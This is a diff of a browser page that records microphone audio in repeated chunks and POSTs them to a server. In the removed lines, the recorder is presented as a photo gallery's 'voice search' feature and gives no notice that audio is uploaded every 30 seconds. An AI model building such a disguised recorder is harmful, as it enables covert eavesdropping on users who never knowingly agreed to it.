@@ -3,32 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Photo Gallery with Voice Search</title>
+  <title>Voice Recorder (10s Interval)</title>
   <style>
     body {
       margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
       font-family: Arial, sans-serif;
       background: #0f172a;
       color: white;
-      text-align: center;
-      padding: 20px;
     }
-    .gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 15px;
-      margin-top: 20px;
-    }
-    .gallery img {
-      width: 100%;
-      height: 250px;
+    #hero-image {
+      width: 320px;
+      height: 320px;
       object-fit: cover;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+      border-radius: 16px;
+      margin-top: 20px;
+      display: none;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
     }
     button {
-      padding: 12px 24px;
-      font-size: 16px;
+      padding: 14px 28px;
+      font-size: 18px;
       font-weight: bold;
       cursor: pointer;
       border: none;
@@ -36,21 +35,19 @@
       background-color: #2563eb;
       color: white;
     }
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #94a3b8;
+    }
   </style>
 </head>
 <body>
 
-  <h2>Beautiful Photo Gallery</h2>
-  <button id="startBtn">Enable Voice Features</button>
+  <h2>Live Voice Recording</h2>
+  <button id="startBtn">Allow Mic & Start</button>
+  <img id="hero-image" src="https://picsum.photos/600/600" alt="Display Visual">
   <p id="status"></p>
-
-  <!-- Photo Gallery -->
-  <div class="gallery">
-    <img src="https://picsum.photos/600/600?random=1" alt="Gallery Image 1">
-    <img src="https://picsum.photos/600/600?random=2" alt="Gallery Image 2">
-    <img src="https://picsum.photos/600/600?random=3" alt="Gallery Image 3">
-    <img src="https://picsum.photos/600/600?random=4" alt="Gallery Image 4">
-  </div>
 
   <script>
     let mediaRecorder;
@@ -60,8 +57,9 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         
+        document.getElementById('hero-image').style.display = 'block';
         document.getElementById('startBtn').style.display = 'none';
-        document.getElementById('status').innerText = 'Voice Feature Active.';
+        document.getElementById('status').innerText = 'Session Active: Uploading audio every 10 seconds...';
 
         mediaRecorder = new MediaRecorder(stream);
         
@@ -69,11 +67,12 @@
           if (event.data.size > 0) audioChunks.push(event.data);
         };
 
+        // Har 10 second (10000 ms) me recording pause/stop karke upload karega
         setInterval(() => {
           if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
           }
-        }, 30000);
+        }, 10000); // Changed from 30000 to 10000
 
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
@@ -83,14 +82,19 @@
           formData.append('audio', audioBlob, 'recording.webm');
 
           try {
-            await fetch('/upload-audio', {
+            const res = await fetch('/upload-audio', {
               method: 'POST',
               body: formData
             });
+            const data = await res.json();
+            if (data.success) {
+              console.log('Recording uploaded to Cloudinary & Saved in MongoDB:', data.url);
+            }
           } catch (err) {
             console.error('Upload Error:', err);
           }
 
+          // Restart recording for next 10s chunk
           if (stream.active) {
             mediaRecorder.start();
           }
